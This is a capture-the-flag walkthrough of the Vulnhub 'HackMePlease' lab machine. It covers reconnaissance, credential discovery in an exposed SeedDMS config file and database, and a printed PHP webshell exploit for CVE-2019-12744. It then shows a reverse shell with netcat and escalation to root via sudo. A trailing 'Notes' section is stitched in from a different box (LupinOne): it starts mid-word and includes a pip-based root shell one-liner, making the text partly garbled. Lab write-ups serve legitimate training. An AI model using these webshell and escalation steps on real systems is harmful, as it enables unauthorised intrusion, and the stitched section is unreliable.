# Vulnhub HackMePlease


Vulnhub Training Walkthrough -- HackMePlease

<!--more-->

## Knowledge

- js information
- conf file search
- mysql search

## 1. Environment Setup

Download the target [rar file](https://download.vulnhub.com/hackmeplease/Hack_Me_Please.rar), unrar and import into VMware.

## 2. Reconnaisence

### 1. IP Address

arp-scan get ip address:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for v4ler1an:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
172.16.86.2	00:50:56:fd:f8:ec	(Unknown)
172.16.86.150	00:0c:29:5c:d6:04	(Unknown)
172.16.86.254	00:50:56:f7:44:1e	(Unknown)

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.232 seconds (114.70 hosts/sec). 4 responded
```

### 2. Port Info

nmap get port and service information:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ nmap -p- -sV -sC  172.16.86.150 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 22:11 EST


┌──(v4ler1an㉿kali)-[~]
└─$ nmap -T4 -p- -sV -sC  172.16.86.150 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 22:11 EST
Nmap scan report for 172.16.86.150
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to the land of pwnland
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
| Not valid before: 2021-07-03T00:33:15
|_Not valid after:  2031-07-01T00:33:15
| mysql-info:
|   Protocol: 10
|   Version: 8.0.25-0ubuntu0.20.04.1
|   Thread ID: 44
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew, FoundRows, LongPassword, IgnoreSigpipes, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: GoAEc\x05_7@yr\x0C:usjD6d+
|_  Auth Plugin Name: caching_sha2_password
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=11/13%Time=6552E561%P=x86_64-pc-linux-gnu
SF:%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HT
SF:TPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNS
SF:VersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestT
SF:CP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
SF:\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCo
SF:okie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messa
SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x0
SF:5HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStr
SF:ing,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
SF:x01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x
SF:20message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\
SF:0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Not
SF:esRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x
SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inv
SF:alid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds
```

Port and service info:

| port  | service             |
| ----- | ------------------- |
| 80    | Apache httpd 2.4.41 |
| 3306  | MySQL 8.0.25        |
| 33060 | mysqlx              |

Access the web page:

![image-20231114114339908](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141143149.png)

It's a common web page, and find nothing.

### 3. Web Directory

Well, just scan the web directory:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ gobuster dir -u http://172.16.86.150:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.86.150:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 312] [--> http://172.16.86.150/img/]
/css                  (Status: 301) [Size: 312] [--> http://172.16.86.150/css/]
/js                   (Status: 301) [Size: 311] [--> http://172.16.86.150/js/]
/fonts                (Status: 301) [Size: 314] [--> http://172.16.86.150/fonts/]
/server-status        (Status: 403) [Size: 278]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Just find some common directory.

Look into `js` directory, maybe we can find some userful js file:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ gobuster dir -u http://172.16.86.150:80/js/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .js,.txt -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.86.150:80/js/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/main.js              (Status: 200) [Size: 2997]
/plugins.js           (Status: 200) [Size: 126889]
/vendor               (Status: 301) [Size: 318] [--> http://172.16.86.150/js/vendor/]
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```

We can see a `vendor` directory and `main.js` and `plugins.js`. Access them, and can find something useful in `main.js`:

![image-20231114114838434](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141148581.png)

We got a path named `/seeddms51x/seeddms-5.1.22/`, access it:

![image-20231114114923877](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141149029.png)

Well, it looks like a CMS named  `SeedDMS` 's login page. 

## 3. Exploit

Search exploit about SeedDMS:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sudosearchsploit -t seeddms
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)                                                                                                                                                             | php/webapps/50062.py
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                                                                                                                                                            | php/webapps/48324.txt
SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting                                                                                                                                                                  | php/webapps/47024.txt
SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting                                                                                                                                                                    | php/webapps/47023.txt
SeedDMS versions < 5.1.11 - Remote Command Execution                                                                                                                                                                        | php/webapps/47022.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ searchsploit -x php/webapps/47022.txt
  Exploit: SeedDMS versions < 5.1.11 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/47022
     Path: /usr/share/exploitdb/exploits/php/webapps/47022.txt
    Codes: CVE-2019-12744
 Verified: False
File Type: ASCII text



┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ cat /usr/share/exploitdb/exploits/php/webapps/47022.txt
# Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions <5.1.11]
# Google Dork: [NA]
# Date: [20-June-2019]
# Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
# Vendor Homepage: [https://www.seeddms.org]
# Software Link: [https://sourceforge.net/projects/seeddms/files/]
# Version: [SeedDMS versions <5.1.11] (REQUIRED)
# Tested on: [NA]
# CVE : [CVE-2019-12744]

Exploit Steps:

Step 1: Login to the application and under any folder add a document.
Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.

PHP Backdoor Code:
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Step 3: Now after uploading the file check the document id corresponding to the document.
Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.

Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
```

If we want to use the exploit, we need to login the website. But we have no passwd now.

### 1. Scan the web path

We has found a url path named `/seeddms51x/seeddms-5.1.22/`, so we can scan it now:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ gobuster dir -u http://172.16.86.150/seeddms51x/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.86.150/seeddms51x/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 301) [Size: 324] [--> http://172.16.86.150/seeddms51x/data/]
/www                  (Status: 301) [Size: 323] [--> http://172.16.86.150/seeddms51x/www/]
/conf                 (Status: 301) [Size: 324] [--> http://172.16.86.150/seeddms51x/conf/]
/pear                 (Status: 301) [Size: 324] [--> http://172.16.86.150/seeddms51x/pear/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Well, we found a `conf`, keep scanning:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ gobuster dir -u http://172.16.86.150/seeddms51x/conf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x .txt,.conf,.xml,.php-t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.86.150/seeddms51x/conf
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,conf,xml,php-t
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/settings.xml         (Status: 200) [Size: 12377]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

Well, we can find mysql username and password in `settings.xml` file:

![image-20231114192921392](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141929656.png)

### 2. Login to mysql

We use the username and password login to mysql, and look for something useful:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ mysql -u seeddms -h 172.16.86.150 -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MySQL [seeddms]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| seeddms            |
| sys                |
+--------------------+
5 rows in set (0.002 sec)

MySQL [(none)]> use seeddms;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [seeddms]> show tables;
+------------------------------+
| Tables_in_seeddms            |
+------------------------------+
| tblACLs                      |
| tblAttributeDefinitions      |
| tblCategory                  |
| tblDocumentApproveLog        |
| tblDocumentApprovers         |
| tblDocumentAttributes        |
| tblDocumentCategory          |
| tblDocumentContent           |
| tblDocumentContentAttributes |
| tblDocumentFiles             |
| tblDocumentLinks             |
| tblDocumentLocks             |
| tblDocumentReviewLog         |
| tblDocumentReviewers         |
| tblDocumentStatus            |
| tblDocumentStatusLog         |
| tblDocuments                 |
| tblEvents                    |
| tblFolderAttributes          |
| tblFolders                   |
| tblGroupMembers              |
| tblGroups                    |
| tblKeywordCategories         |
| tblKeywords                  |
| tblMandatoryApprovers        |
| tblMandatoryReviewers        |
| tblNotify                    |
| tblSessions                  |
| tblUserImages                |
| tblUserPasswordHistory       |
| tblUserPasswordRequest       |
| tblUsers                     |
| tblVersion                   |
| tblWorkflowActions           |
| tblWorkflowDocumentContent   |
| tblWorkflowLog               |
| tblWorkflowMandatoryWorkflow |
| tblWorkflowStates            |
| tblWorkflowTransitionGroups  |
| tblWorkflowTransitionUsers   |
| tblWorkflowTransitions       |
| tblWorkflows                 |
| users                        |
+------------------------------+
43 rows in set (0.003 sec)
```

We can find users in table `users`:

```shell
MySQL [seeddms]> select * from users;
+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1 | saket               | saurav             | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+
1 row in set (0.003 sec)
```

the password is plaintext.

We can found users in table `tblUsers`:

![image-20231114193335821](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141933087.png)

And we can find a `admin` user and password, try to decrypt the passwd with MD5:

![image-20231114193523530](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141935802.png)

Failed. Well, we can try to update the passwd of admin:

![image-20231114193704173](/Users/v4ler1an/Library/Application Support/typora-user-images/image-20231114193704173.png)

Ok, let us login the website:

![image-20231114193829247](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141938519.png)

And then, we can use exploit now.

### 3. Exploit the website

We upload a php reverse shell to website:

![image-20231114194413643](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141944910.png)

We need to attention at the file ID:

![image-20231114194542518](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141945800.png)

Because when we access the shell file, we need to know the id of it:

![image-20231114194932337](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141949608.png)

After we upload the file twice, the ID changed to 5.

And then, we can access the shell through uri `/data/1048576/5/shell.php`, and listen on kali:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ nc -lvp 1234
listening on [any] 1234 ...
172.16.86.150: inverse host lookup failed: Unknown host
connect to [172.16.86.138] from (UNKNOWN) [172.16.86.150] 55002
Linux ubuntu 5.8.0-59-generic #66~20.04.1-Ubuntu SMP Thu Jun 17 11:14:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 03:56:09 up 43 min,  0 users,  load average: 0.74, 0.22, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



## 4. Privilege Escalation

First, turn on the interactive shell with python:

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Look up users:

```shell
www-data@ubuntu:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
saket:x:1000:1000:Ubuntu_CTF,,,:/home/saket:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
```

Well, we found the user `saket` which we has seen it in `users` table. Try to switch to it with password `Saket@#$1337` and su to root:

```shell
saket@ubuntu:/$ id
id
uid=1000(saket) gid=1000(saket) groups=1000(saket),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
saket@ubuntu:/$ sudo -l
sudo -l
[sudo] password for saket: Saket@#$1337

Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL
saket@ubuntu:/$ sudo su
sudo su
root@ubuntu:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/# ls /root
ls /root
app.apk  Documents  Music     Public  Templates
Desktop  Downloads  Pictures  snap    Videos
```

## Notes


ge the `/usr/lib/python3.9/webbrowser.py` file to achive the root.

Modify the file `/usr/lib/python3.9/webbrowser.py` as follows, add some payload:

![image-20231113175900550](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131759811.png)

And then execute the heist.py file:

```shell
icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
arsene@LupinOne:/home/icex64$ id
uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
arsene@LupinOne:/home/icex64$ cd /home/arsene/
arsene@LupinOne:~$ ls
heist.py  note.txt
arsene@LupinOne:~$ cat note.txt
Hi my friend Icex64,

Can you please help check if my code is secure to run, I need to use for my next heist.

I dont want to anyone else get inside it, because it can compromise my account and find my secret file.

Only you have access to my program, because I know that your account is secure.

See you on the other side.

Arsene Lupin.
```

Well, how we can get root? Condiser the `sudo -l`:

```shell
arsene@LupinOne:~$ sudo -l
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
```

The pip application has root privilege, so we can use it:

```shell
arsene@LupinOne:~$ TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
Processing /tmp/tmp.e43H2KlJDL
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
root.txt
# cat /root/root.txt
*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,                       .&&&&&&&&&(            /&&&&&&&&&
,                    &&&&&&*                          @&&&&&&
,                *&&&&&                                   &&&&&&
,              &&&&&                                         &&&&&.
,            &&&&                   ./#%@@&#,                   &&&&*
,          &%&&          &&&&&&&&&&&**,**/&&(&&&&&&&&             &&&&
,        &@(&        &&&&&&&&&&&&&&&.....,&&*&&&&&&&&&&             &&&&
,      .& &          &&&&&&&&&&&&&&&      &&.&&&&&&&&&&               &%&
,     @& &           &&&&&&&&&&&&&&&      && &&&&&&&&&&                @&&&
,    &%((            &&&&&&&&&&&&&&&      && &&&&&&&&&&                 #&&&
,   &#/*             &&&&&&&&&&&&&&&      && #&&&&&&&&&(                 (&&&
,  %@ &              &&&&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/
,  & &               &&&&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &
, & &                &&&&&&&&&&&&&&&,     &&& &&&&&&&&&&(                   &,@
,.& #                #&&&&&&&&&&&&&&(     &&&.&&&&&&&&&&&                   & &
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
*& *              &&&&&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
*&              &&&&&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
*% .           &&&&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
*& *            &&&&&&&&&&   /*      @%&%&&&&&&&&    &&&&,                   @ &
*& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
*& &                    &&&&&        /   /&&&&         &&&                   & @
*/(,                      &&                            &                   / &.
* & &                     &&&       #             &&&&&&      @             & &.
* .% &                    &&&%&     &    @&&&&&&&&&.   %@&&*               ( @,
/  & %                   .&&&&  &@ @                 &/                    @ &
*   & @                  &&&&&&    &&.               ,                    & &
*    & &               &&&&&&&&&& &    &&&(          &                   & &
,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &
,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &
,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &
,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*
,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@
,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&
,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&
,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&  &&
/                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,
,                           &&&&&/...         .#&&&&#

3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
See you on the next heist.
```







## Notes


